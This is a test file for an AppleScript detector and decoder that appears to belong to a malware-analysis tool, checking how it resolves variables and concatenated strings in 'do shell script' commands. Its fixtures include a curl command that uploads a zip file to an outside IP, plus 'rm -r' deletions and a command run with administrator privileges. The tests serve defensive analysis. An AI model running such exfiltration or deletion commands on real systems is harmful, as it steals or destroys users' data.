import { describe, it, expect } from 'vitest';
import { looksLikeAppleScript, decodeAppleScript } from '../src/applescript';

describe('looksLikeAppleScript', () => {
  it('detects `do shell script`', () => {
    expect(looksLikeAppleScript('do shell script "echo hi"')).toBe(true);
  });
  it('detects `tell application`', () => {
    expect(looksLikeAppleScript('tell application "Finder" to activate')).toBe(true);
  });
  it('does not flag JXA `doShellScript` (camelCase, no spaces)', () => {
    expect(looksLikeAppleScript('app.doShellScript("x")')).toBe(false);
  });
});

describe('decodeAppleScript', () => {
  it('extracts a literal `do shell script` command as a shell sink', () => {
    const r = decodeAppleScript('do shell script "echo hi"');
    expect(r.capturedStrings).toContain('echo hi');
    expect(r.events.some((e) => e.kind === 'shell' && e.detail === 'echo hi')).toBe(true);
  });

  it('resolves `&` concatenation and `set` variables', () => {
    const src = 'set u to "https://example.com/x"\nset c to "curl " & u\ndo shell script c';
    expect(decodeAppleScript(src).capturedStrings).toContain('curl https://example.com/x');
  });

  it('drops trailing clauses like `with administrator privileges`', () => {
    const r = decodeAppleScript('do shell script "id" with administrator privileges');
    expect(r.capturedStrings).toContain('id');
  });

  it('unwraps a `set X to (do shell script "…")` wrapper and partials unknown vars', () => {
    const src = 'set r to (do shell script "echo wrapped")\ndo shell script "rm " & mystery';
    const r = decodeAppleScript(src);
    expect(r.capturedStrings).toContain('echo wrapped'); // trailing ) stripped, resolved cleanly
    expect(r.capturedStrings).toContain('rm <mystery>'); // unresolved var rendered as a placeholder
  });

  it('cleanly resolves an escaped-quote curl exfil command', () => {
    const src = 'set s to (do shell script "curl -F \\"f=@/tmp/out.zip\\" http://198.51.100.7/x")';
    expect(decodeAppleScript(src).capturedStrings).toContain('curl -F "f=@/tmp/out.zip" http://198.51.100.7/x');
  });

  it('resolves system attribute through path concatenation (Task 2)', () => {
    const src = [
      'set username to (system attribute "USER")',
      'set profile to "/Users/" & username',
      'do shell script "ls " & profile',
    ].join('\n');
    expect(decodeAppleScript(src).capturedStrings).toContain('ls /Users/<USER>');
  });

  it('resolves a plain string variable through do shell script (Task 2)', () => {
    const src = [
      'set w to "/tmp/x/"',
      'do shell script "rm -r " & w',
    ].join('\n');
    expect(decodeAppleScript(src).capturedStrings).toContain('rm -r /tmp/x/');
  });

  it('does NOT store a list-literal map var; unresolved sink renders placeholder (Task 2)', () => {
    const src = [
      'set m to {{"a", "b"}}',
      'do shell script "echo " & m',
    ].join('\n');
    expect(decodeAppleScript(src).capturedStrings).toContain('echo <m>');
  });

});
